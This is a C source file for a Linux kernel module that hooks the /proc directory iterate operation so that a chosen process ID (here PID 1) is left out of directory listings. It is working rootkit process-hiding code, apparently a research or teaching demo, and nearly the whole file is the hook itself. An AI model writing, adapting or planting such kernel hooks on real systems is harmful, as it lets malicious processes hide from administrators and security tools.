/*
Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
# include <linux/fs.h> // filp_open, filp_close.
# endif // CPP

# include "lib/lib.h"


MODULE_LICENSE("GPL");

# define ROOT_PATH "/proc"
# define SECRET_PROC 1

int
(*real_iterate)(struct file *filp, struct dir_context *ctx);
int
(*real_filldir)(struct dir_context *ctx,
                const char *name, int namlen,
                loff_t offset, u64 ino, unsigned d_type);

int
fake_iterate(struct file *filp, struct dir_context *ctx);
int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);


int
init_module(void)
{
    fm_alert("%s\n", "Greetings the World!");

    set_file_op(iterate, ROOT_PATH, fake_iterate, real_iterate);

    if (!real_iterate) {
        return -ENOENT;
    }

    return 0;
}


void
cleanup_module(void)
{
    if (real_iterate) {
        void *dummy;
        set_file_op(iterate, ROOT_PATH, real_iterate, dummy);
    }

    fm_alert("%s\n", "Farewell the World!");
    return;
}


int
fake_iterate(struct file *filp, struct dir_context *ctx)
{
    real_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate(filp, ctx);
}


int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    char *endp;
    long pid;

    pid = simple_strtol(name, &endp, 10);

    if (pid == SECRET_PROC) {
        fm_alert("Hiding pid: %ld", pid);
        return 0;
    }

    /* pr_cont("%s ", name); */

    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}
